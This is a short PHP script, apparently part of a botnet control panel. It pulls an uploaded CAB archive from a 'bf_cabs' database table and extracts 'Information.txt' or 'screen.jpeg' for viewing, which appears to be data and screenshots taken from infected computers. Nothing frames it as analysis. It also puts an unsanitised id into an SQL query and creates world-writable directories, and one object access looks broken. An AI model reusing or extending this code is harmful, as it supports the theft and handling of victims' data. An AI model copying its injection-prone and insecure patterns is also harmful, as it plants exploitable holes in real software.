<?php

if(!empty($Cur['id']) && !empty($Cur['str'])){
	$item = $mysqli->query('SELECT id, file from bf_cabs WHERE id = '.$Cur['id'].' LIMIT 1');
	//cabextract -F screen.jpeg -d /var/www/lighttpd/check.ples.in/cache/cabs/ 1003771869.cab
	if($item->id == $Cur['id']){		switch($Cur['str']){			case 'text':
            	$t = time() . mt_rand('1111', '9999');
            	mkdir('cache/cabs/' . $t . '/');
            	chmod('cache/cabs/' . $t . '/', 0777);
            	exec('cabextract -F Information.txt -d '.realpath('cache/cabs/' . $t . '/').' ' . realpath('logs/cabs/' . $item->file));
            	if(file_exists('cache/cabs/' . $t . '/Information.txt')){
            		header('Content-Type: text/plain;');
            		print(file_get_contents('cache/cabs/' . $t . '/Information.txt'));
            		@unlink('cache/cabs/' . $t . '/Information.txt');
            		@rmdir('cache/cabs/' . $t);
            	}else{
            		print('ERROR!');
            	}
			break;

			case 'img':
            	$t = time() . mt_rand('1111', '9999');
            	mkdir('cache/cabs/' . $t . '/');
            	chmod('cache/cabs/' . $t . '/', 0777);
            	exec('cabextract -F screen.jpeg -d '.realpath('cache/cabs/' . $t . '/').' ' . realpath('logs/cabs/' . $item->file));
            	if(file_exists('cache/cabs/' . $t . '/screen.jpeg')){
            		header('Content-Type: image/jpeg;');
            		print(file_get_contents('cache/cabs/' . $t . '/screen.jpeg'));
            		@unlink('cache/cabs/' . $t . '/screen.jpeg');
            		@rmdir('cache/cabs/' . $t);
            	}else{            		print('ERROR!');
            	}
			break;
		}
	}
}

exit;

?>